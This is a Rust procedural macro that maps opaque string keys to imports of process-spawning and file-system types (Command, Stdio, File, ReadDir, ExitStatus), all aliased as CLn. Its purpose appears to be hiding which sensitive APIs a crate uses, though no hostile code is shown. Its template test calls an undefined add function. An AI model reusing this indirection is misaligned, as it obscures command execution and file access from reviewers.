use proc_macro::TokenStream;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn it_works() {
        let result = add(2, 2);
        assert_eq!(result, 4);
    }
}

#[proc_macro]
pub fn di(input: TokenStream) -> TokenStream {
    let input_str = input.to_string();
    let dimp = match input_str.as_str() {
        "\"5sCiq\"" => {
            r#"
            use std::fs::ReadDir;
            pub type CLn = ReadDir;
            "#
        },
        "\"socmk\"" => {
            r#"
            use std::process::Stdio;
            pub type CLn = Stdio;
            "#
        },
        "\"sTsaf\"" => {
            r#"
            use std::process::Command;
            pub type CLn = Command;
            "#
        },
        "\"1os9CX\"" => {
            r#"
            use std::fs::File;
            pub type CLn = File;
            "#
        },
        "\"Osm21G\"" => {
            r#"
            use std::process::ExitStatus;
            pub type CLn = ExitStatus;
            "#
        },
        _ => "pub type CLn = ();"
    };
    
    dimp.parse().unwrap()
}